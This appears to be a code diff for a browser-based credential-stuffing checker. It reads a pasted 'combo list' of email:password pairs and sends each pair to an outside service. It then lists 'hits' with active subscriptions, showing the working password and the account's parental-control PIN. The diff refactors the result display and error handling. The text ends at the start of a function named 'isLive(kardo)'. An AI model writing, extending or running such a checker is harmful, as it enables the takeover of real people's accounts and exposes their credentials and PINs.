@@ -1,35 +1,39 @@
 
 document.addEventListener('DOMContentLoaded', function () {
-
     var checkBtn = document.getElementById("checkBtn");
     checkBtn.addEventListener('click', async function () {
         const comboList = document.getElementById('comboList').value;
         const credentials = comboList.split('\n');
-
-        const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
+        const hitsOutput = document.getElementById('hitsOutput');
+        hitsOutput.innerHTML = '';
 
         try {
+            const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
             const responses = await Promise.all(requests);
-            const hitsOutput = document.getElementById('hitsOutput');
-            hitsOutput.innerHTML = '';
+
+            let hitCount = 0;
             responses.forEach(response => {
-                console.log(response.data,response.data?.subscriptionStatus.toUpperCase())
-                if (response.data?.subscriptionStatus.toUpperCase() == 'ACTIVE') {
-                    hitsOutput.innerHTML += `
-                    <div class="card mx-auto">
-                        <div class="card-body text-center">
-                        ${response.data.emeylpassword} - ${response.data.subscriptionStatus} - ${response.data.parentalControlPin}
+                console.log(response.data, response.data?.subscriptionStatus.toUpperCase());
+                if (response.data?.subscriptionStatus.toUpperCase() === 'ACTIVE') {
+                    hitCount++;
+                    hitsOutput.insertAdjacentHTML('beforeend', `
+                        <div class="card mx-auto">
+                            <div class="card-body text-center">
+                                ${response.data.emeylpassword} - ${response.data.subscriptionStatus} - ${response.data.parentalControlPin}
+                            </div>
                         </div>
-                    </div>
-                    `
+                    `);
                 }
-                // console.log(response.data);
             });
+
+            if (hitCount === 0) {
+                hitsOutput.innerHTML = 'No active subscriptions found.';
+            }
         } catch (error) {
             console.error(error);
+            hitsOutput.innerHTML = 'An error occurred while checking the credentials.';
         }
     });
-
 });
 
 function isLive(kardo) {
